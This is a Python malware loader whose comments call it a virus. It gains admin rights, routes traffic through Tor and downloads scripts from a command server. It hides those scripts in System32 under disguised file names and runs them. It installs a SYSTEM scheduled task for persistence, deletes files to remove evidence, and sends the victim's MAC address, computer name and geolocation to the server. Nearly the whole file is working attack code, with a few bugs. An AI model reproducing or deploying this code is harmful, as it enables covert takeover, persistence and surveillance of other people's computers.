import os # To interact with operating system
import sys # To interact with operating system
import ctypes # to get admin privileges
import requests # To download scripts
import subprocess # to launch scripts with admin privileges
import shutil # to copy script
from zipfile import ZipFile # to deal with zip files
from getmac import get_mac_address # to get mac address
from platform import node # to get computer name
from time import sleep # for any delays
import destroyer

URL = 'http://10.0.2.2:8000' # the url from which the zip containing the scripts will be downloaded
ZIP_NAME = 'scripts.zip' # what the name of the zip containing the scripts should be called
TOR_INITIAL = True # whether the script should make the intial request through tor or the clearweb. Recommended True so you don't leak what you're doing to the router
TIME = 1723820601 # the time that the started file will be set to verify it hasn't been changed
TaskName = 'WindowsGeneralManager'
scripts_file = '' # a file that is a list of all the scripts
started_file = ''  # a file that is made after the initial launch to tell the starter that the scripts were already downloaded
scripts_direc = ''
scripts_paths = [] # the paths of the scripts
data = os.path.join(sys._MEIPASS, "data") # directory of all the files included within the exe. Includes the Task Scheduler XML, destroyer cmd file, TOR installation

os.environ['HTTP_PROXY'] = 'socks5h://127.0.0.1:9050' # set global proxy variables so all requests automatically go through the Tor SOCKS5 proxy without having to specify it in every request
os.environ['HTTPS_PROXY'] = 'socks5h://127.0.0.1:9050' # ^

pids = []
platform = ''

if 'win' in sys.platform:
    platform = 'win'

elif sys.platform == 'linux':
    platform = 'linux'

def start_tor(): # start Tor and wait for it to be up&ready
    process = subprocess.Popen(os.path.join(data, "tor\\tor.exe"), stdout=subprocess.PIPE, text=True)
    while True:
        line = process.stdout.readline()
        if '100%' in line:
            break

def check_admin(win=False):
    if win: # for windows
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() # check if admin
        except:
            return False # an exception will be raised if not admin
    else: # for linux
        return os.getuid() == 0 # check for admin

def get_admin(win=False):
    if win:
        is_python_script = os.path.basename(sys.executable).startswith('python')
        if is_python_script: # check if the launching environment is a python script or a standalone exe since sys.argv needs to be different for each one (sys.argv[0] is 'python' so that causes problems for .exe files which are not started that way)
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1) # restart the script, prompting for admin privileges
        else: # for .exe files
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1) # restart the script, prompting for admin privileges
    sys.exit() # stop the script that doesn't have admin

def get_scripts(): # downloads the scripts and puts them all in one place
    r = requests.get(URL + '/scripts', headers={'os':sys.platform}) # download the script zips and send the server your OS so it knows which scripts to send
    with open(ZIP_NAME, 'wb') as zip: # create the zip file
        zip.write(r.content) # put the binary content from the request into the zip file
    with ZipFile(ZIP_NAME, 'r') as zip: # open the zip file in ZipFile mode so
        scripts = zip.namelist() # get the list of files in the zip
        for script in scripts:
            with open(f"{scripts_direc}\\{script}", 'wb') as s: # make the file for each script
                s.write(zip.read(script)) # put the contents of the script in the zip into the file being made outside of the zip in the chosen folder
                if not '.ovpn' in script: # make sure that no .ovpn file is logged as a script
                    scripts_paths.append(f'{scripts_direc}\\{script}') # add the script and its path to the list of script paths
                s.close() # close the script file from memory
        zip.close() # close the zip file from memory
    for script_path in scripts_paths:
        with open(scripts_file, 'w') as f:
            f.write(script_path)
    os.remove(ZIP_NAME) # delete the zip file to remove evidence

def start_scripts(alreadyRan=False):
    for script in scripts_paths:
        try:
            if '.py' in script: # for python scripts
                process = subprocess.Popen([sys.executable, script]) # start each python script
                sleep(0.5)
                pids.append(process.pid)
            else: # for any files
                subprocess.Popen(script, shell=True) # start each script
                sleep(0.5)
                pids.append(process.pid)
        except: # if one of the scripts fail to run for any reason
            if alreadyRan:
                pass # probably destroy here
            else:
                start_scripts(alreadyRan=True)

def make_renewable(py, platform): # makes the script start with admin privileges every time the computer is restarted
    if platform == 'win':
        Command = 'python' if py else __file__  # execute the file, with python if needed
        Arguments = __file__ if py else ''
        WorkingDirectory = __file__.replace(fr'\{os.path.basename(__file__)}', "")  # make the current directory the working directory
        # The command to register the task that will automatically rerun this script on every logon
        cmd = ['schtasks',  # Call task scheduler
               '/Create',  # Tell it you're trying to make a task
               '/TN', TaskName,  # Specify the name of the task
               '/XML', f'{data}\\{TaskName}.xml',  # Tell it to import the task xml
               '/RU', 'SYSTEM',  # Specify that the user making the task is SYSTEM for highest privileges
               '/F']  # force override if already exists to avoid any errors
        subprocess.run(cmd)  # register the task
    elif platform == 'linux':
        pass

def make_path_list():
    with open(scripts_file, 'w') as f:
        for script in scripts_paths:
            f.write(f"{script}\n")
        f.close()

def load_paths():
    with open(scripts_file) as f:
        paths = f.readlines() #
        f.close()
        return paths

def disclose_identity(): # tell the server a lot of details about the computer so it can classify and note it down
    information = {"mac":get_mac_address(), 'name':node()} # get mac address of computer and computer name
    r = requests.get('http://ip-api.com/json/') # use an api to get a variety of information about the computer
    r = r.json() # get information recieved into a dictionary
    information['lon'] = r['lon'] # add the information to the dictionary that will be sent the server
    information['lat'] = r['lat']
    information['city'] = r['city']
    information['country'] = r['country']
    information['isp'] = r['isp']

    r = requests.post(URL+'/identity', json=information) # send the information

if platform == 'win': # check if win in sys.platform and not win == sys.platform because sys.platform might be win32 or win64 which work the same for this script
    scripts_direc = (r'C:\Windows\System32\WXR')  # the directory where the script will hide new files
    started_file = 'C:\\Windows\\systemqi.dll'
    scripts_file = 'C:\\Windows\\boot-helper.dat'

    if not check_admin(True):
        get_admin(True)
elif 'linux' == platform:
    scripts_direc = ('')  # the directory where the script will hide new files
    started_file = ''  # a file that is made after the initial launch to tell the starter that the scripts were already downloaded
    if not check_admin(False):
        get_admin(False)
else:
    # -- delete all evidence of the virus --
    sys.exit() # stop the script

if os.path.exists(started_file): # check if the starter has run before and if you just need to start the scripts or download them as well
    scripts_paths.append(load_paths())
    start_scripts()
else:
    os.makedirs(scripts_direc, exist_ok=True)  # make the directory for the scripts that will be downloaded
    # destroyer.setup_destroy_mechanism()
    get_scripts()
    make_path_list()
    if '.py' in __file__:
        make_renewable(True, platform)
    else:
        make_renewable(False, platform)

    with open(started_file, 'w') as f: # open the started file to log that the scripts were downloaded
        f.close()
    start_scripts()
